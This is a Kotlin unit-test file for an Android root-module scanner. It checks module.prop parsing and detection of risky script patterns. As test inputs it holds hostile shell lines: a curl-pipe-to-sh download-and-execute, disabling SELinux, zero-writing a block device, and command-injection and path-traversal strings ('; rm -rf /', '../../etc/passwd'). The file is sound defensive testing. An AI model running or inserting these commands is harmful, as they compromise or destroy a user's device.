package com.modradar.app.scan.ksu

import org.junit.Assert.assertEquals
import org.junit.Assert.assertFalse
import org.junit.Assert.assertTrue
import org.junit.Test

/** module.prop 解析与脚本危险模式检测。 */
class KsuModuleTest {

    private val propText = """
        id=lsposed
        name=LSPosed
        version=v1.9.2
        versionCode=7024
        author=LSPosed Developers
        description=一个 Riru/Zygisk 模块
    """.trimIndent()

    @Test
    fun `解析 module_prop 全部字段`() {
        val p = ModuleProp.parse(propText)
        assertEquals("lsposed", p["id"])
        assertEquals("LSPosed", p["name"])
        assertEquals("v1.9.2", p["version"])
        assertEquals("7024", p["versionCode"])
    }

    @Test
    fun `忽略注释与空行`() {
        val p = ModuleProp.parse("# 注释\n\nid=x\nname=y")
        assertEquals("x", p["id"])
        assertEquals("y", p["name"])
        assertFalse(p.containsKey("# 注释"))
    }

    @Test
    fun `缺少必备字段时列出缺失项`() {
        val p = ModuleProp.parse("id=x\nname=y")
        val missing = ModuleProp.missingFields(p)
        assertTrue(missing.contains("version"))
        assertTrue(missing.contains("author"))
        assertFalse(missing.contains("id"))
    }

    @Test
    fun `toInfo 缺 id 时回退到目录名`() {
        val info = ModuleProp.toInfo(ModuleProp.parse("name=OnlyName"), dir = "/data/adb/modules/foo")
        assertEquals("foo", info.id)
    }

    @Test
    fun `检测管道下载执行`() {
        val hits = ScriptRisk.scan("curl -sL https://x/y.sh | sh")
        assertTrue(hits.any { it.label.contains("下载后直接执行") })
    }

    @Test
    fun `检测 resetprop 与 bind 挂载`() {
        val hits = ScriptRisk.scan("resetprop ro.debuggable 1\nmount --bind /data/x /system/x")
        assertTrue(hits.any { it.label.contains("修改系统属性") })
        assertTrue(hits.any { it.label.contains("bind 挂载") })
    }

    @Test
    fun `检测关闭 SELinux 与写块设备`() {
        val hits = ScriptRisk.scan("setenforce 0\ndd if=/dev/zero of=/dev/block/x")
        assertTrue(hits.any { it.label.contains("SELinux") })
        assertTrue(hits.any { it.label.contains("块设备") })
    }

    @Test
    fun `注释行不触发`() {
        val hits = ScriptRisk.scan("# curl http://x | sh")
        assertTrue(hits.isEmpty())
    }

    @Test
    fun `正常脚本不误报`() {
        val hits = ScriptRisk.scan("ui_print '安装中'\ncp -f \$MODPATH/system/bin/x /system/bin/x")
        assertTrue(hits.isEmpty())
    }

    @Test
    fun `scanAll 只保留有命中的脚本`() {
        val out = ScriptRisk.scanAll(
            mapOf(
                "service.sh" to "curl http://x | sh",
                "clean.sh" to "echo ok",
            )
        )
        assertEquals(1, out.size)
        assertTrue(out.containsKey("service.sh"))
    }

    @Test
    fun `路径白名单拒绝注入`() {
        assertTrue(RootShell.isSafePath("/data/adb/modules/lsposed"))
        assertTrue(RootShell.isSafePath("/data/adb/ksu/modules/x/module.prop"))
        assertFalse(RootShell.isSafePath("/data/adb/modules/x; rm -rf /"))
        assertFalse(RootShell.isSafePath("/data/adb/modules/x`id`"))
        assertFalse(RootShell.isSafePath("/system/bin/sh"))
        assertFalse(RootShell.isSafePath("/data/adb/modules/../../etc/passwd"))
    }
}
